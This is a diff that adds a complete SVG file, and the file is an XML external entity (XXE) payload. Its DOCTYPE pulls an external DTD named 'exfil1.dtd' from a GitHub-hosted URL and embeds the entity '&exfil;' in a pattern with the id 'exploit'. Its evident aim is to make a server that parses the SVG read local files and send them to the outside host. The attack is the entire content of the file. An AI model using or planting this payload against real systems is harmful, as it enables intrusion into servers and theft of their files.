@@ -1,0 +1,13 @@
+<!DOCTYPE svg [
+<!ENTITY % outside SYSTEM "https://raw.githubusercontent.com/Nayssers/nayssers.github.io/main/exfil1.dtd">
+%outside;
+]>
+<svg>
+<defs>
+<pattern id="exploit">
+  <text x="10" y="10">
+    &exfil;
+  </text>
+</pattern>
+</defs>
+</svg>
